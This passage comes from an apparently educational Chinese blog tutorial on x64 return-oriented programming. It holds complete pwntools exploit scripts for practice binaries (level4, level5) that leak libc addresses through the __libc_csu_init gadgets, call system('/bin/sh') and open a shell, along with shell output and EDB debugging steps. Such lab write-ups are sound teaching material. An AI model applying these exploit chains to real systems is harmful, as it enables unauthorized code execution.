class="line"></span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">p = process(<span class="string">'./level4'</span>)</span><br><span class="line"><span class="comment">#p = remote('127.0.0.1',10001)</span></span><br><span class="line"></span><br><span class="line">binsh_addr_offset = int(next(libc.search(<span class="string">'/bin/sh'</span>),<span class="number">16</span>) - libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"binsh_addr_offset= "</span> + hex(binsh_addr_offset)</span><br><span class="line"></span><br><span class="line">pop_ret_offset = <span class="number">0x0000000000021102</span> - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"pop_ret_offset= "</span> + hex(pop_ret_offset)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pop_pop_call_offset = 0x0000000000107419 - libc.symbols['system']</span></span><br><span class="line"><span class="comment">#print "pop_pop_call_offset= " + hex(pop_pop_call_offset)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n##########receving system addr############\n"</span></span><br><span class="line">system_addr_str = p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">system_addr = int(system_addr_str,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr= "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">binsh_addr = system_addr + binsh_addr_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">"binsh_addr= "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">pop_ret_addr = system_addr + pop_ret_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">"pop_ret_addr= "</span> + hex(pop_ret_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pop_pop_call_addr = system_addr + pop_pop_call_offset</span></span><br><span class="line"><span class="comment">#print "pop_pop_call_addr = " + hex(pop_pop_call_addr)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">136</span></span><br><span class="line">payload += p64(pop_ret_addr)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = 'A'*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###########sending payload###########\n"</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ python level2_exp.py </span><br><span class="line">[*] <span class="string">'/home/buffer/\xe6\xa1\x8c\xe9\x9d\xa2/practice/ROP_x64/0x02/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./level4'</span>: pid 10853</span><br><span class="line">binsh_addr_offset= 0x1479c7</span><br><span class="line">pop_ret_offset= -0x2428e</span><br><span class="line"></span><br><span class="line"><span class="comment">##########receving system addr############</span></span><br><span class="line"></span><br><span class="line">system_addr= 0x7f0357f17390</span><br><span class="line">binsh_addr= 0x7f035805ed57</span><br><span class="line">pop_ret_addr= 0x7f0357ef3102</span><br><span class="line"></span><br><span class="line"><span class="comment">###########sending payload###########</span></span><br><span class="line"></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ whoami</span><br><span class="line">buffer</span><br></pre></td></tr></table></figure><h3 id="0x04-通用gadgets"><a href="#0x04-通用gadgets" class="headerlink" title="0x04 通用gadgets"></a>0x04 通用gadgets</h3><p>因为程序在编译过程中会加入一些通用函数用来进行<code>初始化操作</code>（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些<code>通用的gadgets</code>加以使用，从而达到我们想要达到的效果。</p><p>为了方便大家学习x64下的ROP，level3和level4的程序都留了一些辅助函数在程序中，这次我们将这些<code>辅助函数</code>去掉再来挑战一下。目标程序level5.c如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法<code>泄露内存</code>信息，找到system()的值，然后再传递<code>“/bin/sh”</code>到<code>.bss段</code>, 最后调用system(“/bin/sh”)。因为原程序使用了<code>write()</code>和<code>read()</code>函数，我们可以通过<code>write()</code>去输出<code>write.got</code>的地址，从而计算出<code>libc.so在内存中的地址</code>。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过<code>寄存器传值</code>。我们使用ROPgadget并没有找到类似于<code>pop rdi, ret,pop rsi, ret</code>这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们用objdump -d ./level5观察一下<code>__libc_csu_init()</code>这个函数。一般来说，只要程序调用了<code>libc.so</code>，程序都会有这个函数用来对libc进行初始化操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">00000000004005c0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  4005c0:41 57                push   %r15</span><br><span class="line">  4005c2:41 56                push   %r14</span><br><span class="line">  4005c4:41 89 ff             mov    %edi,%r15d</span><br><span class="line">  4005c7:41 55                push   %r13</span><br><span class="line">  4005c9:41 54                push   %r12</span><br><span class="line">  4005cb:4c 8d 25 3e 08 20 00 lea    0x20083e(%rip),%r12        # 600e10 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  4005d2:55                   push   %rbp</span><br><span class="line">  4005d3:48 8d 2d 3e 08 20 00 lea    0x20083e(%rip),%rbp        # 600e18 &lt;__init_array_end&gt;</span><br><span class="line">  4005da:53                   push   %rbx</span><br><span class="line">  4005db:49 89 f6             mov    %rsi,%r14</span><br><span class="line">  4005de:49 89 d5             mov    %rdx,%r13</span><br><span class="line">  4005e1:4c 29 e5             sub    %r12,%rbp</span><br><span class="line">  4005e4:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  4005e8:48 c1 fd 03          sar    $0x3,%rbp</span><br><span class="line">  4005ec:e8 0f fe ff ff       callq  400400 &lt;_init&gt;</span><br><span class="line">  4005f1:48 85 ed             test   %rbp,%rbp</span><br><span class="line">  4005f4:74 20                je     400616 &lt;__libc_csu_init+0x56&gt;</span><br><span class="line">  4005f6:31 db                xor    %ebx,%ebx</span><br><span class="line">  4005f8:0f 1f 84 00 00 00 00 nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4005ff:00 </span><br><span class="line">  400600:4c 89 ea             mov    %r13,%rdx</span><br><span class="line">  400603:4c 89 f6             mov    %r14,%rsi</span><br><span class="line">  400606:44 89 ff             mov    %r15d,%edi</span><br><span class="line">  400609:41 ff 14 dc          callq  *(%r12,%rbx,8)</span><br><span class="line">  40060d:48 83 c3 01          add    $0x1,%rbx</span><br><span class="line">  400611:48 39 eb             cmp    %rbp,%rbx</span><br><span class="line">  400614:75 ea                jne    400600 &lt;__libc_csu_init+0x40&gt;</span><br><span class="line">  400616:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  40061a:5b                   pop    %rbx</span><br><span class="line">  40061b:5d                   pop    %rbp</span><br><span class="line">  40061c:41 5c                pop    %r12</span><br><span class="line">  40061e:41 5d                pop    %r13</span><br><span class="line">  400620:41 5e                pop    %r14</span><br><span class="line">  400622:41 5f                pop    %r15</span><br><span class="line">  400624:c3                   retq</span><br></pre></td></tr></table></figure><p>我们可以看到利用<code>0x400606</code>处的代码我们可以控制<code>rbx,rbp,r12,r13,r14和r15</code>的值，随后利用<code>0x4005f0</code>处的代码我们将<code>r15</code>的值赋值给<code>rdx</code>, <code>r14</code>的值赋值给<code>rsi</code>,<code>r13</code>的值赋值给<code>edi</code>，随后就会调用<code>call qword ptr [r12+rbx\*8]</code>。这时候我们只要再将<code>rbx</code>的值赋值为<code>0</code>，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx*8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果<code>相等</code>就会继续向下执行并<code>ret</code>到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将<code>rbp</code>的值设置为<code>1</code>，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。这里借用一张别人画的图，看一下栈中的数据分布：</p><div align="left"><br>    <img src="/resources/2018/2018-05-11-00.png" alt="栈中布局分布图"><br></div><p>这里再说一下，我用objdump反汇编出来的结果，是<code>r13</code>寄存器的值赋值给<code>rdx</code>、<code>r14</code>寄存器的值赋值给<code>rsi</code>、<code>r15</code>的低三十二位赋值给<code>edi</code>，但是蒸米大神文章中是反过来的，一会可以在exp中体现出来，下面是蒸米大神的反汇编结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">........</span><br><span class="line">  4005f0:   4c 89 fa                mov    %r15,%rdx</span><br><span class="line">  4005f3:   4c 89 f6                mov    %r14,%rsi</span><br><span class="line">  4005f6:   44 89 ef                mov    %r13d,%edi</span><br><span class="line">  4005f9:   41 ff 14 dc             callq  *(%r12,%rbx,8)</span><br><span class="line">  4005fd:   48 83 c3 01             add    $0x1,%rbx</span><br><span class="line">  400601:   48 39 eb                cmp    %rbp,%rbx</span><br><span class="line">  400604:   75 ea                   jne    4005f0 &lt;__libc_csu_init+0x50&gt;</span><br><span class="line">  400606:   48 8b 5c 24 08          mov    0x8(%rsp),%rbx</span><br><span class="line">  40060b:   48 8b 6c 24 10          mov    0x10(%rsp),%rbp</span><br><span class="line">  400610:   4c 8b 64 24 18          mov    0x18(%rsp),%r12</span><br><span class="line">  400615:   4c 8b 6c 24 20          mov    0x20(%rsp),%r13</span><br><span class="line">  40061a:   4c 8b 74 24 28          mov    0x28(%rsp),%r14</span><br><span class="line">  40061f:   4c 8b 7c 24 30          mov    0x30(%rsp),%r15</span><br><span class="line">  400624:   48 83 c4 38             add    $0x38,%rsp</span><br><span class="line">  400628:   c3                      retq</span><br></pre></td></tr></table></figure><p>我们先构造<code>payload1</code>，利用<code>write()</code>输出<code>write在内存中的地址</code>。注意我们的gadget是call qword ptr [r12+rbx<em>8]，所以我们应该使用<code>write.got</code>的地址<code>而不是write.plt</code>的地址。并且为了返回到原程序中，重复利用buffer overflow的漏洞，我们需要<code>继续覆盖栈上的数据</code>，直到把返回值覆盖成目标函数的<code>main函数</code>为止。这里说一下payload1 += “\x00”\</em>56这句话，当时纠结了很久，思路不是很清晰，没看懂，一直在调试看栈上的这七个数据存的到底是什么，最后发现根本不用关心它存的是什么，不过这些值会存到rbx、rbp、r12….寄存器中，这里覆盖这些值只是为了让程序返回的时候返回的是<code>main</code>的地址，要想覆盖那个地址就要覆盖前面栈上的数据。这里可能说的啰嗦了，大佬轻喷，我是小白。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdi=edi=r15, rsi=r14, rdx=r13</span></span><br><span class="line"><span class="comment">#write(rdi=1,rsi=write_got,rdx=8)</span></span><br><span class="line">payload1 = <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">                <span class="comment">#pop        junk      rbx      rbp         r12           r13         r14           r15          ret</span></span><br><span class="line">payload1 += p64(<span class="number">0x400616</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(<span class="number">0x400600</span>)</span><br><span class="line">payload1 += <span class="string">"\x00"</span>*<span class="number">56</span>  <span class="comment">#0x38</span></span><br><span class="line">payload1 += p64(main_addr)</span><br></pre></td></tr></table></figure><p>这里看一下覆盖完栈数据后<code>栈上数据的分布</code>：</p><div align="left"><br>    <img src="/resources/2018/2018-05-11-01.png" alt="覆盖数据后栈中数据分布图"><br></div><p>当我们exp在收到<code>write()</code>在内存中的地址后，就可以计算出<code>system()</code>在<code>内存中的地址</code>了。接着我们构造<code>payload2</code>，利用<code>read()</code>将<code>system()的地址</code>以及<code>“/bin/sh”</code>读入到<code>.bss段</code>内存中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdi=edi=r15, rsi=r14, rdx=r13</span></span><br><span class="line"><span class="comment">#read(rdi=0,rsi=bss_addr,rdx=16)</span></span><br><span class="line">payload2 = <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">                <span class="comment">#pop        junk      rbx      rbp         r12           r13         r14           r15          ret</span></span><br><span class="line">payload2 += p64(<span class="number">0x400616</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">16</span>) + p64(bss_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0x400600</span>)</span><br><span class="line">payload2 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">payload2 += p64(main_addr)</span><br></pre></td></tr></table></figure><p>最后我们构造<code>payload3</code>,调用system()函数执行“/bin/sh”。注意，<code>system()的地址</code>保存在了<code>.bss段首地址</code>上，<code>“/bin/sh”的地址</code>保存在了<code>.bss段首地址+8</code>字节上。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdi=edi=r15, rsi=r14, rdx=r13</span></span><br><span class="line"><span class="comment">#system(rdi=bss_addr+8="/bin/sh\0")</span></span><br><span class="line">payload3 = <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">                <span class="comment">#pop        junk      rbx      rbp         r12           r13         r14           r15          ret</span></span><br><span class="line">payload3 += p64(<span class="number">0x400616</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) +p64(bss_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0x400600</span>)</span><br><span class="line">payload3 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">payload3 += p64(main_addr)</span><br></pre></td></tr></table></figure><p>最终exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'level5'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level5'</span>)</span><br><span class="line"><span class="comment">#p = remote('127.0.0.1',10001)</span></span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"write_got= "</span> + hex(write_got)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"read_got= "</span> + hex(read_got)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x400587</span></span><br><span class="line"></span><br><span class="line">system_off_addr = libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_off_addr= "</span> + hex(system_off_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rdi=edi=r15, rsi=r14, rdx=r13</span></span><br><span class="line"><span class="comment">#write(rdi=1,rsi=write_got,rdx=8)</span></span><br><span class="line">payload1 = <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">                <span class="comment">#pop        junk      rbx      rbp         r12           r13         r14           r15          ret</span></span><br><span class="line">payload1 += p64(<span class="number">0x400616</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(<span class="number">0x400600</span>)</span><br><span class="line">payload1 += <span class="string">"\x00"</span>*<span class="number">56</span>  <span class="comment">#0x38</span></span><br><span class="line">payload1 += p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n################seding payload1################\n"</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"write_addr= "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - system_off_addr</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr= "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x601040</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#rdi=edi=r15, rsi=r14, rdx=r13</span></span><br><span class="line"><span class="comment">#read(rdi=0,rsi=bss_addr,rdx=16)</span></span><br><span class="line">payload2 = <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">                <span class="comment">#pop        junk      rbx      rbp         r12           r13         r14           r15          ret</span></span><br><span class="line">payload2 += p64(<span class="number">0x400616</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">16</span>) + p64(bss_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0x400600</span>)</span><br><span class="line">payload2 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">payload2 += p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###############seding payload2################\n"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(system_addr))</span><br><span class="line">p.send(<span class="string">"/bin/sh\0"</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rdi=edi=r15, rsi=r14, rdx=r13</span></span><br><span class="line"><span class="comment">#system(rdi=bss_addr+8="/bin/sh\0")</span></span><br><span class="line">payload3 = <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">                <span class="comment">#pop        junk      rbx      rbp         r12           r13         r14           r15          ret</span></span><br><span class="line">payload3 += p64(<span class="number">0x400616</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) +p64(bss_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0x400600</span>)</span><br><span class="line">payload3 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">payload3 += p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n##############seding payload3###############\n"</span></span><br><span class="line">p.send(payload3)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>要注意的是，当我们把程序的<code>io重定向</code>到<code>socket</code>上的时候，根据网络协议，因为发送的<code>数据包过大</code>，<code>read()有时会截断payload</code>，造成payload传输不完整造成攻击失败。这时候要多试几次即可成功。如果进行<code>远程攻击</code>的话，需要保证<code>ping值足够小</code>才行（局域网）。最终执行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ python level5_exp.py </span><br><span class="line">[*] <span class="string">'/home/buffer/\xe6\xa1\x8c\xe9\x9d\xa2/practice/ROP_x64/0x03/level5'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[*] <span class="string">'/home/buffer/\xe6\xa1\x8c\xe9\x9d\xa2/practice/ROP_x64/0x03/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./level5'</span>: pid 13296</span><br><span class="line">write_got= 0x601018</span><br><span class="line">read_got= 0x601020</span><br><span class="line">system_off_addr= 0xb1f20</span><br><span class="line"></span><br><span class="line"><span class="comment">################seding payload1################</span></span><br><span class="line"></span><br><span class="line">write_addr= 0x7f14523e92b0</span><br><span class="line">system_addr= 0x7f1452337390</span><br><span class="line"></span><br><span class="line"><span class="comment">###############seding payload2################</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##############seding payload3###############</span></span><br><span class="line"></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">buffer</span><br></pre></td></tr></table></figure><h3 id="0x05-EDB调试器"><a href="#0x05-EDB调试器" class="headerlink" title="0x05 EDB调试器"></a>0x05 EDB调试器</h3><p>我们在学习Linux ROP的过程中一定少不了调试这一环节，虽然gdb的功能很强大，但命令行界面对很多人来说并不友好。很多学习Windows调试的人用惯了ollydbg再接触gdb的话总感觉很难上手。其实在linux下也有<code>类似于ollydbg</code>的调试工具，那就是<code>EDB-debugger</code>。这里给出edb的下载地址，具体的编译请参考readme：</p><div class="github-widget" data-repo="eteran/edb-debugger"></div><p>下面我们就拿level5做例子来讲解一下如何使用EDB。首先是<code>挂载(attach)进程</code>和<code>设置断点(break point)</code>。我们知道当我们在用exp.py脚本进行攻击的时候，脚本会一直运行，我们并没有足够的时间进行挂载操作。想要进行调试的话我们需要让脚本<code>暂停一下</code>，随后再进行挂载。暂停的方法很简单，只需要在脚本中加一句<code>”raw_input()”</code>即可。比如说我们想在发送payload1之前暂停一下脚本，只需要这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ss = raw_input()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload1#############\n"</span></span><br><span class="line">p.send(payload1)</span><br></pre></td></tr></table></figure><p>这样的话，当脚本运行起来后，就会在<code>raw_input()</code>这一行停下来，<code>等待用户输入</code>。这时候我们就可以<code>启动EDB进行挂载</code>了。</p><div align="left"><br>    <img src="/resources/2018/2018-05-11-02.jpg" alt="Attach To Process"><br></div><p>使用<code>EDB进行挂载</code>非常简单，输入进程名点ok即可。</p><div align="left"><br>    <img src="/resources/2018/2018-05-11-03.jpg" alt="跳转"><br></div><p>挂载上以后就可以设置断点了。首先在调试窗口按<code>”ctrl + g”</code>就可以<code>跳转</code>到目标地址，我们这里将地址设置为<code>0x400610</code>，也就是<code>第一个gadget</code>的地址。</p><div align="left"><br>    <img src="/resources/2018/2018-05-11-04.jpg" alt="设置断点"><br></div><p>接着我们在<code>0x400610</code>这个地址前<code>双击</code>，就可以看到一个<code>红点</code>，说明我们已经<code>成功的下了断点</code>。接着按<code>“F9”</code>或者<code>点击”Run”</code>就可以让程序<code>继续运行</code>了。</p><p>虽然程序继续运行了，但是脚本还在继续等待用户的输入，这时候只需要在命令行<code>按一下回车</code>，程序就会<code>继续运行</code>，随后会暂停在<code>”0x400610”</code>这个断点。</p><div align="left"><br>    <img src="/resources/2018/2018-05-11-05.jpg" 